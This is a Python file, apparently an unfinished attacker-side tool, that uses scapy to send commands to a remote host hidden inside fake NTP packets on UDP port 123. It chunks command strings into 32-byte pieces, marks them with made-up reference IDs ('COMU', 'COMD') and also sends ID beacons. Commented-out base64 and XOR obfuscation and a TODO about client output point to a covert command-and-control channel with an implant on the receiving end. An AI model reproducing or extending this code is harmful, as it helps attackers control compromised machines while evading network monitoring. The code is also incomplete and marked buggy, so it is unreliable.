import datetime
import base64

from scapy.all import IP, UDP, NTP, send

class Packet:
    def __init__(self, destination):
        self.destination = destination
        self.baseline = "\x1a\x01\x0a\xf0" + "\x00"*7 #TODO something is wrong here
    

class NTPPacket(Packet):
    def __init__(self, destination, timeinfo):
        super().__init__(destination)
        self.timeinfo = timeinfo
    

    def sendTimePacket(self):
        pass 
        #refId = GPS\x00
        #use actual NTP scapy?

   

class CommandPacket(Packet):
    def __init__(self, destination, command):
        super().__init__(destination)
        self.command = command
    
    
    def sendCommandPacket(self):
        if len(self.command) > 32:
            cmdArr = [self.command[i:i+32] for i in range(0, len(self.command), 32)]
        else:
            cmdArr = [self.command]

        #print(cmdArr)
        for ctr in range(0, len(cmdArr)):
            if ctr < len(cmdArr)-1:
                refId = str("COMU".encode('utf-8')).strip('b\'') #Command Unfinished
            else:
                refId = str("COMD".encode('utf-8')).strip('b\'')  #Command Finished

            ucode = str(cmdArr[ctr].encode("utf-8")).strip('b\'')#.strip("\"") #Encoded command

            ntpPayload = self.baseline + refId + ucode +"\x00"*(32-len(cmdArr[ctr]))
            ntpPayload = ntpPayload.replace("\\", "").strip("b\'")
            """
            base64_bytes = base64.b64encode(ntpPayload.encode('utf-8'))

            #outbytes = b''
            #for bt in base64_bytes:
                #outbytes += bytes([bt ^ ord(chr(46))])

            ntpPayload = str(base64_bytes)
            print(len(ntpPayload))
            """
            #ntpPayload = ntpPayload.replace("\\\\", "\\")

            packet = IP(dst=self.destination)/UDP(dport=123,sport=50000)/(ntpPayload)
            #TODO fix this port shit, something is sus here. firewall response?

            send(packet, verbose=0)



class IDPacket(Packet):
    def __init__(self, destination, refId):
        super().__init__(destination)
        self.refId = refId


    def sendIdPacket(self):
        payload = self.baseline
        payload += str(self.refId.encode('utf-8')).strip('b\'')
        payload += 32*"\x00"
        packet = IP(dst=self.destination)/UDP(dport=123,sport=50000)/(payload)

        send(packet, verbose=0)



#TODO COMO ref id  -> output by client
    